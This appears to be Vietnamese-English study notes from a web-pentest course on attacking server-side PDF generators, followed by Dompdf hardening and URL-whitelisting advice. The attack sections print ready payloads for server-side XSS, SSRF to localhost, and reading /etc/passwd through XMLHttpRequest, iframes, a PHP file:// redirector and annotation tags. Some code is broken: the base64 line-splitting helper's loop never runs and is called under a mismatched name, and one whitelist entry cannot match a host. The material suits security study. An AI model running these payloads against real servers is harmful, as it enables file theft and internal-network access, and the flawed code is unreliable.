# PDF Generation Vulnerability

PDF generation là 1 chức năng thường được triển khai trong các ứng dụng web. Để thực hiện các chức năng này, các ứng dụng web thường sử dụng các thư viện, plugin PDF generation. Các thư viện phổ biến như là: TCPDF, html2pdf, DomPDF, wkhtmltopdf, ...

Web application có thể truyền vào HTML code, sau đó các thư viện, plugin này sẽ parsing HTML, rendering it and creating a PDF file. Nếu dữ liệu này không xử lí đúng cách, cùng với lack of proper configuration or outdated version of external library có thể dẫn đến những vulnerability.

## Vulerability

Đầu tiên, ta cần phải kiểm tra xem bên phía server sử dụng library nào để generation PDF file này. Thông tin này thường nằm trong trường creator and producer trong metadata của file. Ta có thể xem các giá trị này bằng cách sử dụng exiftool.

```bash
exiftool CWEE/Document/HTB\ -\ Senior\ Web\ Penetration\ Tester\ 2025.5/@FsKnockouT-1.\ Injection\ Attacks.pdf 

ExifTool Version Number         : 12.76
File Name                       : @FsKnockouT-1. Injection Attacks.pdf
Directory                       : CWEE/Document/HTB - Senior Web Penetration Tester 2025.5
File Size                       : 2.3 MB
File Modification Date/Time     : 2024:11:11 01:18:53+07:00
File Access Date/Time           : 2026:10:27 19:42:26+07:00
File Inode Change Date/Time     : 2026:10:26 12:12:44+07:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 55
Title                           : 1. Injection Attacks
Creator                         : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.7.4 Chrome/126.0.6478.234 Electron/31.6.0 Safari/537.36
Producer                        : pdf-lib (https://github.com/Hopding/pdf-lib)
Create Date                     : 2024:11:10 16:49:27+00:00
Modify Date                     : 2024:11:10 16:49:28Z

```

### Javascript Code Execution

Because the PDF generation library renders HTML input, it might execute out injected Javascript code. Futhermore, with the PDF generation library running on the server, the payload would also be  executed on the server -> Server-Side XSS.

Nếu bị dính lỗi, để khai thác ta đơn giản chỉ cần chèn vào JS code mà ta muốn thực thi.

Ex: `<script>document.write(window.location)</script>`

### SSRF

```html
<img src="http://localhost/xyz">
<link rel="stylesheet" href="http://hihi">

Vì images and stylesheets thường không trả về response in generated PDF vì thế nó chỉ trở thành blind SSRF (khó exploit)
Vì thế, tùy thuộc vào misconfiguration của PDF generation library, chúng ta có thể chèn 1 số HTML elements khác mà trigger a request and make the server display response
<iframe src="http://localhost/api/users"></iframe>
```

### LFI

If server executes our injected JS, we can read local file using XMLHttpRequest and the file protocol

```html
<script>
x = new XMLHttpRequest();
x.onload = function(){
document.write(this.responseText)
};
x.open("GET", "file:///etc/passwd");
x.send();
</script>
```

Tuy nhiên, việc đọc trực tiếp rất có thể dẫn đến lỗi. Ví dụ khi mà ta đọc SSH key, vì thế ta có thể sử dụng `btoa` function để base64-encode. Ngoài ra, nếu 1 dòng quá dài nó rất có thể không fit với PDF page từ đó dẫn đến việc bị cắt một mất 1 phần dữ liệu. Lúc này ta có thể inject \n data sau mỗi 100 kí tự để đảm bảo nó fits với PDF page. Khi decode base64 ta chỉ cần thêm options ignores the linebreaks

```html
<script>
    function addNewLines(str){
        var res = '';
        while(str.length < 0){
            res += str.substring(0,100) + '\n';
            str = str.substring(100);
        }
        return res;
    }
    x = new XMLHttpRequest();
    x.onload = function(){
        document.write(addNewlines(btoa(this.responseText)))
    }
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```

Without JS execution
```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

Trong 1 số trường hợp, ta có thể dựng 1 server thực hiện redirect

```php
<?php header('Location: file://' . $_GET['url']); ?> 
```

Sau đó nhúng iframe tới server đó

```html
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd"
width="800" height="500"></iframe>
```

### Annotations

1 số PDF generation library hỗ trợ các tính năng nâng cao như `annotations` hay `attachments`. Chúng cũng có thể dẫn đến leak local files trên server.

For example, consider the PDF generation library mPDF , which supports annotations via the
`<annotations>` tag. We can use annotations to append files to the generated PDF file by
injecting a payload like the following:

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```
Another PDF generation library that supports attachments is `PD4ML`

```html
< attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```
## Prevention

* Thay đổi cấu hình mặc định của PDF: đọc tài liệu về configuration và cấu hình các quyền đủ để phục vụ mục đích của ứng web, hạn chế tối đa các quyền nguy hiểm

```php
# Example: Dompdf
<?php
require_once 'vendor/autoload.php';

use Dompdf\Dompdf;
use Dompdf\Options;

// 1. Khởi tạo cấu hình bảo mật
$options = new Options();

// CHẶN RCE: Tuyệt đối không cho phép thực thi mã PHP bên trong HTML
$options->setIsPhpEnabled(false); 

// CHẶN XSS/RCE: Tuyệt đối không cho phép thực thi JavaScript
$options->setIsJavascriptEnabled(false); 

// CHẶN SSRF: Không cho phép Dompdf tự động tải hình ảnh/stylesheet từ URL bên ngoài (từ Internet)
$options->setIsRemoteEnabled(false); 

// CHẶN LFI: Giới hạn thư mục được phép đọc tệp cục bộ (chỉ cho phép thư mục chứa asset của ứng dụng)
// Tránh việc kẻ tấn công chèn tệp hệ thống như src="/etc/passwd"
$options->setChroot(__DIR__ . '/assets'); 

// 2. Khởi tạo Dompdf với cấu hình trên
$dompdf = new Dompdf($options);
```

* Kiểm soát dữ liệu đầu vào từ người dùng: 

    * Mã hóa toàn bộ HTML ( ví dụ htmlentities trong php ) nếu có thể
    * Nếu buộc phải mở rộng -> whitelist tag nếu có thể ( dompurify, htmlpurify, ... )

* Quản lý tài nguyên ảnh, styesheet:

    * Thiết lập tường lửa chặn toàn bộ các yêu cầu kết nối ra ngoài nếu có thể
    * Áp dụng whitelist URL nếu cần tải tài nguyên từ bên ngoài
    * Tải về lưu trữ cục bộ: đối với các tài nguyên mẫu cố định, ta nên tải về server trước sau đó chỉnh sửa HTML để gọi các bản sao này

```php
# Tải và lưu trữ cục bộ

// Đường dẫn tới tệp ảnh cục bộ an toàn trên máy chủ của bạn
$imagePath = __DIR__ . '/assets/logo.png'; 

if (file_exists($imagePath)) {
    $imageData = base64_encode(file_get_contents($imagePath));
    // Tạo chuỗi mã nguồn ảnh Base64 hợp lệ trong HTML
    $imageSrc = 'data:image/png;base64,' . $imageData;
} else {
    $imageSrc = '';
}

$htmlTemplate = "
<html>
<body>
    <!-- Ảnh được nhúng trực tiếp dạng chuỗi, Dompdf không cần phải tạo kết nối mạng mạng để tải -->
    <img src='{$imageSrc}' width='150' />
    <p>Nội dung tài liệu PDF ở đây...</p>
</body>
</html>
";

$dompdf->loadHtml($htmlTemplate);
$dompdf->render();
```

```php
# Whitelist URL

<?php
function getSafeExternalImage($url) {
    // 1. Định nghĩa danh sách các domain được phép tải tài nguyên
    $allowedDomains = [
        'tinypic.com',
        'imgur.com',
        '://unsplash.com'
    ];

    // Parse URL để kiểm tra domain
    $parsedUrl = parse_url($url);
    $host = strtolower($parsedUrl['host'] ?? '');

    // Kiểm tra domain có nằm trong Whitelist không
    if (!in_array($host, $allowedDomains)) {
        throw new Exception("Domain không nằm trong danh sách an toàn!");
    }

    // 2. Chặn DNS Rebinding & IP nội bộ bằng cách phân giải IP trước khi tải
    $ip = gethostbyname($host);
    
    // Kiểm tra nếu IP thuộc dải mạng nội bộ (Private / Loopback / Link-local)
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        throw new Exception("Yêu cầu bị chặn: IP hướng vào mạng nội bộ!");
    }

    // Nếu an toàn, tiến hành tải file bằng cURL với các giới hạn nghiêm ngặt
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Giới hạn thời gian tải tối đa 5 giây tránh treo server
    curl_setopt($ch, CURLOPT_MAXFILESIZE, 2 * 1024 * 1024); // Giới hạn dung lượng file tối đa 2MB
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // KHÔNG đi theo các lệnh chuyển hướng (Redirect) để tránh SSRF bypass
    
    $imageData = curl_exec($ch);
    curl_close($ch);

    return 'data:image/png;base64,' . base64_encode($imageData);
}

// Cách áp dụng khi render PDF:
try {
    $userImageUrl = $_POST['avatar_url']; // Ví dụ: "https://imgur.com"
    $safeBase64Image = getSafeExternalImage($userImageUrl);
    
    $html = "<html><body><img src='{$safeBase64Image}' /></body></html>";
    // Đưa chuỗi $html này vào thư viện PDF để sinh file
} catch (Exception $e) {
    // Xử lý lỗi nếu URL không an toàn
    $html = "<html><body><p>Không thể tải ảnh do vi phạm chính sách bảo mật.</p></body></html>";
}
```

